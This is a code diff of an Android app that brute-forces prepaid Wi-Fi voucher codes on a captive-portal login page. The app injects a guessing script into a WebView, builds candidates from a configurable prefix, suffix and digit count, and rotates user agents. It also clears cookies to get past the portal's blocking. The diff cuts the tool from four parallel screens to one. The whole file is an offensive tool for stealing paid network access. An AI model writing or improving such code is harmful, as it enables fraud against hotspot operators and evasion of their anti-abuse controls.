@@ -14,7 +14,7 @@ import java.nio.charset.StandardCharsets;
 import java.util.Random;
 
 public class MainActivity extends Activity {
-    private WebView[] webs = new WebView[4];
+    private WebView webView;
     private EditText urlBar, etPrefix, etSuffix, etDigits, etAttempts, etPause, etRetry, etStatusEvery, etThreads;
     private TextView statusText, logText, voucherResult;
     private SharedPreferences prefs;
@@ -27,7 +27,7 @@ public class MainActivity extends Activity {
     private final Random rand = new Random();
     private long lastAttemptTime = 0;
     private long globalBlockUntil = 0;
-    private boolean[] isRunning = new boolean[]{false, false, false, false};
+    private boolean isRunning = false;
 
     private final String[] UAS = {
         "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 Chrome/118.0 Mobile",
@@ -54,21 +54,17 @@ public class MainActivity extends Activity {
         statusText = findViewById(R.id.statusText);
         logText = findViewById(R.id.logText);
         voucherResult = findViewById(R.id.voucherResult);
-        
-        webs[0] = findViewById(R.id.web0);
-        webs[1] = findViewById(R.id.web1);
-        webs[2] = findViewById(R.id.web2);
-        webs[3] = findViewById(R.id.web3);
+        webView = findViewById(R.id.webView);
 
         urlBar.setText(prefs.getString("url", "http://7.7.7.7/index.html"));
         etPrefix.setText(prefs.getString("prefix", "5"));
         etSuffix.setText(prefs.getString("suffix", "31"));
         etDigits.setText(prefs.getString("digits", "7"));
         etAttempts.setText(prefs.getString("attempts", "1000"));
-        etPause.setText(prefs.getString("pause", "500"));
+        etPause.setText(prefs.getString("pause", "1000"));
         etRetry.setText(prefs.getString("retry", "1000"));
         etStatusEvery.setText(prefs.getString("statusEvery", "50"));
-        etThreads.setText(prefs.getString("threads", "1"));
+        etThreads.setText("1"); // شاشة واحدة فقط
 
         try {
             InputStream is = getAssets().open("finder.js");
@@ -77,41 +73,36 @@ public class MainActivity extends Activity {
             finderJs = new String(buf, StandardCharsets.UTF_8);
         } catch (Exception e) { appendLog("خطأ تحميل JS: " + e.getMessage()); }
 
-        for (int i = 0; i < 4; i++) {
-            final int id = i;
-            WebSettings s = webs[i].getSettings();
-            s.setJavaScriptEnabled(true);
-            s.setDomStorageEnabled(true);
-            s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
-            CookieManager.getInstance().setAcceptThirdPartyCookies(webs[i], true);
-            webs[i].addJavascriptInterface(new Bridge(id), "AndroidBridge" + id);
-            
-            webs[i].setWebViewClient(new WebViewClient() {
-                @Override public void onPageFinished(WebView view, String url) {
-                    if (isRunning[id]) {
-                        String p = etPrefix.getText().toString().trim();
-                        String s = etSuffix.getText().toString().trim();
-                        int d = parseInt(etDigits, 7);
-                        int a = parseInt(etAttempts, 1000);
-                        int pz = parseInt(etPause, 500);
-                        String cfg = "window.FINDER_CONFIG={id:" + id + ",prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:" + pz + "};";
-                        view.evaluateJavascript(cfg, null);
-                        view.evaluateJavascript(finderJs, null);
-                        appendLog("[W" + id + "] 🔄 تم إعادة حقن السكربت تلقائياً");
-                    }
+        WebSettings s = webView.getSettings();
+        s.setJavaScriptEnabled(true);
+        s.setDomStorageEnabled(true);
+        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
+        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
+        webView.addJavascriptInterface(new Bridge(0), "AndroidBridge0");
+
+        webView.setWebViewClient(new WebViewClient() {
+            @Override public void onPageFinished(WebView view, String url) {
+                if (isRunning) {
+                    String p = etPrefix.getText().toString().trim();
+                    String s = etSuffix.getText().toString().trim();
+                    int d = parseInt(etDigits, 7);
+                    int a = parseInt(etAttempts, 1000);
+                    int pz = parseInt(etPause, 1000);
+                    String cfg = "window.FINDER_CONFIG={id:0,prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:" + pz + "};";
+                    view.evaluateJavascript(cfg, null);
+                    view.evaluateJavascript(finderJs, null);
+                    appendLog("[W0] 🔄 تم إعادة حقن السكربت بعد التحديث");
                 }
-            });
-        }
+            }
+        });
 
         findViewById(R.id.btnGo).setOnClickListener(v -> {
             targetUrl = urlBar.getText().toString().trim();
             if (!targetUrl.startsWith("http")) targetUrl = "http://" + targetUrl;
             prefs.edit().putString("url", targetUrl).apply();
-            for (int i = 0; i < 4; i++) {
-                webs[i].getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
-                webs[i].loadUrl(targetUrl);
-            }
-            appendLog("تم تحميل الرابط في 4 شاشات");
+            webView.getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
+            webView.loadUrl(targetUrl);
+            appendLog("تم تحميل الرابط");
         });
 
         findViewById(R.id.btnFinder).setOnClickListener(v -> {
@@ -119,9 +110,9 @@ public class MainActivity extends Activity {
             panel.setVisibility(panel.getVisibility() == View.VISIBLE ? View.GONE : View.VISIBLE);
         });
 
-        findViewById(R.id.btnBack).setOnClickListener(v -> { for (WebView w : webs) if (w.canGoBack()) w.goBack(); });
-        findViewById(R.id.btnForward).setOnClickListener(v -> { for (WebView w : webs) if (w.canGoForward()) w.goForward(); });
-        findViewById(R.id.btnRefresh).setOnClickListener(v -> { for (WebView w : webs) w.reload(); });
+        findViewById(R.id.btnBack).setOnClickListener(v -> { if (webView.canGoBack()) webView.goBack(); });
+        findViewById(R.id.btnForward).setOnClickListener(v -> { if (webView.canGoForward()) webView.goForward(); });
+        findViewById(R.id.btnRefresh).setOnClickListener(v -> webView.reload());
 
         findViewById(R.id.btnStart).setOnClickListener(v -> startAll());
         findViewById(R.id.btnStop).setOnClickListener(v -> stopAll());
@@ -136,53 +127,38 @@ public class MainActivity extends Activity {
         });
 
         targetUrl = urlBar.getText().toString();
-        for (int i = 0; i < 4; i++) {
-            webs[i].getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
-            webs[i].loadUrl(targetUrl);
-        }
+        webView.getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
+        webView.loadUrl(targetUrl);
     }
 
     private void startAll() {
         stoppedState = false;
+        isRunning = true;
         prefs.edit().putString("prefix", etPrefix.getText().toString()).putString("suffix", etSuffix.getText().toString())
             .putString("digits", etDigits.getText().toString()).putString("attempts", etAttempts.getText().toString())
             .putString("pause", etPause.getText().toString()).putString("retry", etRetry.getText().toString())
-            .putString("statusEvery", etStatusEvery.getText().toString()).putString("threads", etThreads.getText().toString()).apply();
+            .putString("statusEvery", etStatusEvery.getText().toString()).apply();
 
         String p = etPrefix.getText().toString().trim();
         String s = etSuffix.getText().toString().trim();
         int d = parseInt(etDigits, 7);
         int a = parseInt(etAttempts, 1000);
-        int pz = parseInt(etPause, 500);
-        
-        int threads = parseInt(etThreads, 1);
-        if (threads < 1) threads = 1;
-        if (threads > 4) threads = 4;
+        int pz = parseInt(etPause, 1000);
 
-        appendLog("▶ بدء التخمين على " + threads + " شاشة");
-        for(int j=0; j<4; j++) isRunning[j] = false;
+        appendLog("▶ بدء التخمين (شاشة واحدة)");
         voucherResult.setVisibility(View.GONE);
         statusText.setText("جاري التخمين...");
 
-        for (int i = 0; i < threads; i++) {
-            final int index = i;
-            uiHandler.postDelayed(() -> {
-                if (stoppedState) return;
-                isRunning[index] = true;
-                webs[index].getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
-                String cfg = "window.FINDER_CONFIG={id:" + index + ",prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:" + pz + "};";
-                webs[index].evaluateJavascript(cfg, null);
-                webs[index].evaluateJavascript(finderJs, null);
-                appendLog("[W" + index + "] ▶ بدأ العامل");
-            }, i * 2000); 
-        }
+        webView.getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
+        String cfg = "window.FINDER_CONFIG={id:0,prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:" + pz + "};";
+        webView.evaluateJavascript(cfg, null);
+        webView.evaluateJavascript(finderJs, null);
     }
 
     private void stopAll() {
         stoppedState = true;
-        for (int i = 0; i < 4; i++) {
-            webs[i].evaluateJavascript("window.stopFinder && window.stopFinder();", null);
-        }
+        isRunning = false;
+        webView.evaluateJavascript("window.stopFinder && window.stopFinder();", null);
         statusText.setText("⏹ تم الإيقاف");
         appendLog("⏹ تم الإيقاف");
     }
@@ -209,49 +185,15 @@ public class MainActivity extends Activity {
         public Bridge(int id) { this.id = id; }
         
         @JavascriptInterface public void log(String m) { runOnUiThread(() -> appendLog("[W" + id + "] " + m)); }
-        
-        @JavascriptInterface public void progress(int c, int t, String v) { 
-            runOnUiThread(() -> statusText.setText("[W" + id + "] [" + c + "/" + t + "] " + v)); 
-        }
-
-        @JavascriptInterface public synchronized boolean requestTurn(long minGapMs) {
-            long now = System.currentTimeMillis();
-            if (now - lastAttemptTime >= minGapMs) {
-                lastAttemptTime = now;
-                return true;
-            }
-            return false;
-        }
-        
-        
-        @JavascriptInterface public boolean isGloballyBlocked() {
-            return System.currentTimeMillis() < globalBlockUntil;
-        }
-
-        @JavascriptInterface public void triggerGlobalBlock() {
-            if (System.currentTimeMillis() < globalBlockUntil) return;
-            globalBlockUntil = System.currentTimeMillis() + 1500; 
-            runOnUiThread(() -> {
-                appendLog("🛑 حظر! جاري تجديد الجلسة فوراً...");
-            });
-        }
-        
-        @JavascriptInterface public void clearCookies() {
-            runOnUiThread(() -> {
-                CookieManager.getInstance().removeAllCookies(null);
-                CookieManager.getInstance().flush();
-                webs[id].getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
-                appendLog("[W" + id + "] 🧹 تم مسح الكوكيز (جلسة جديدة)");
-            });
-        }
-        
+        @JavascriptInterface public void progress(int c, int t, String v) { runOnUiThread(() -> statusText.setText("[" + c + "/" + t + "] " + v)); }
+        @JavascriptInterface public void clearCookies() { runOnUiThread(() -> { CookieManager.getInstance().removeAllCookies(null); CookieManager.getInstance().flush(); appendLog("🧹 تم مسح الكوكيز"); }); }
         @JavascriptInterface public void found(String v, String st) {
             runOnUiThread(() -> {
-                appendLog("✅✅✅ [W" + id + "] وجد الكرت: " + v);
-                statusText.setText("✅ W" + id + " وجد الكرت!");
+                appendLog("✅✅✅ وجد الكرت: " + v);
+                statusText.setText("✅ وجد الكرت!");
                 voucherResult.setText("✅ الكرت: " + v);
                 voucherResult.setVisibility(View.VISIBLE);
-                Toast.makeText(MainActivity.this, "✅ W" + id + ": " + v, Toast.LENGTH_LONG).show();
+                Toast.makeText(MainActivity.this, "✅ " + v, Toast.LENGTH_LONG).show();
                 stopAll();
             });
         }
